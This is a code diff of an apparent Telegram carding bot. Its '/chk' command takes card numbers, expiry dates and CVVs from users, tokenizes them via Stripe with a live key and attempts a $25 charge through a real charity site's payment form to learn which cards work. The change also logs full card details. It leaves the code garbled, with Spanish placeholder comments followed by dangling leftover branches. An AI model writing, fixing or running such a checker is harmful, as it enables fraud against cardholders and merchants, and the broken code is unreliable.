@@ -271,109 +271,116 @@ async def ch(message: types.Message):
     FIRST = message.from_user.first_name
     try:
         await dp.throttle('chk', rate=ANTISPAM)
-    except Throttled:
-        await message.reply('<b>Too many requests!</b>\n'
-                            f'Blocked For {ANTISPAM} seconds')
+    except Throttled as t:
+        await message.reply(f'<b>Too many requests!</b>\nBlocked For {t.delta} seconds')
+        return
+
+    logging.info(f"Received CC check request from user {ID}: {message.text}")
+    
+    if message.reply_to_message:
+        cc = message.reply_to_message.text
     else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
+        cc = message.text[len('/chk '):]
 
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
+    if len(cc) == 0:
+        return await message.reply("<b>No Card to chk</b>")
+    
+    logging.info(f"Checking CC: {cc}")
 
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
+    x = re.findall(r'\d+', cc)
+    if len(x) < 4:
+        return await message.reply("<b>Invalid card format.</b>")
 
-        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+    ccn, mm, yy, cvv = x[:4]
+    if mm.startswith('2'):
+        mm, yy = yy, mm
+    if len(mm) >= 3:
+        mm, yy, cvv = yy, cvv, mm
+    if len(ccn) < 15 or len(ccn) > 16:
+        return await message.reply('<b>Failed to parse Card</b>\n'
+                                   '<b>Reason: Invalid Format!</b>')
 
-        s = session.post('https://m.stripe.com/6', headers=headers)
-        r = s.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
+    BIN = ccn[:6]
+    if BIN in BLACKLISTED:
+        return await message.reply('<b>BLACKLISTED BIN</b>')
 
-        postdata = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
+    headers = {
+        "user-agent": UA,
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/x-www-form-urlencoded"
+    }
 
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+    s = session.post('https://m.stripe.com/6', headers=headers)
+    r = s.json()
+    Guid = r['guid']
+    Muid = r['muid']
+    Sid = r['sid']
 
-        pr = session.post('https://api.stripe.com/v1/tokens',
-                          data=postdata, headers=HEADER)
-        Id = pr.json()['id']
+    postdata = {
+        "guid": Guid,
+        "muid": Muid,
+        "sid": Sid,
+        "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
+        "card[name]": Name,
+        "card[number]": ccn,
+        "card[exp_month]": mm,
+        "card[exp_year]": yy,
+        "card[cvc]": cvv
+    }
 
-        # hmm
-        load = {
-            "action": "wp_full_stripe_payment_charge",
-            "formName": "BanquetPayment",
-            "fullstripe_name": Name,
-            "fullstripe_email": Email,
-            "fullstripe_custom_amount": "25.0",
-            "fullstripe_amount_index": 0,
-            "stripeToken": Id
-        }
+    HEADER = {
+        "accept": "application/json",
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": UA,
+        "origin": "https://js.stripe.com",
+        "referer": "https://js.stripe.com/",
+        "accept-language": "en-US,en;q=0.9"
+    }
 
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "origin": "https://archiro.org",
-            "referer": "https://archiro.org/banquet/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+    pr = session.post('https://api.stripe.com/v1/tokens',
+                      data=postdata, headers=HEADER)
+    Id = pr.json().get('id')
 
-        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
-                          data=load, headers=header)
-        msg = rx.json()['msg']
+    if not Id:
+        return await message.reply("Failed to get token ID from Stripe.")
 
-        toc = time.perf_counter()
+    load = {
+        "action": "wp_full_stripe_payment_charge",
+        "formName": "BanquetPayment",
+        "fullstripe_name": Name,
+        "fullstripe_email": Email,
+        "fullstripe_custom_amount": "25.0",
+        "fullstripe_amount_index": 0,
+        "stripeToken": Id
+    }
 
-        if 'true' in rx.text:
-            return await message.reply(f'''
+    header = {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "user-agent": UA,
+        "origin": "https://archiro.org",
+        "referer": "https://archiro.org/banquet/",
+        "accept-language": "en-US,en;q=0.9"
+    }
+
+    rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
+                      data=load, headers=header)
+    msg = rx.json().get('msg')
+
+    toc = time.perf_counter()
+
+    if 'true' in rx.text:
+        await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #CHARGED 25$
 <b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
-<b>BOT</b>: @{BOT_USERNAME}''')
+<b>BOT</b>: @{BOT_USERNAME}''', parse_mode='HTML')
+    # ... (código para otros casos)
 
+# ... (resto del código)
         if 'security code' in rx.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
@@ -403,6 +410,6 @@ async def ch(message: types.Message):
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-
 if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
     executor.start_polling(dp, skip_updates=True, loop=loop)
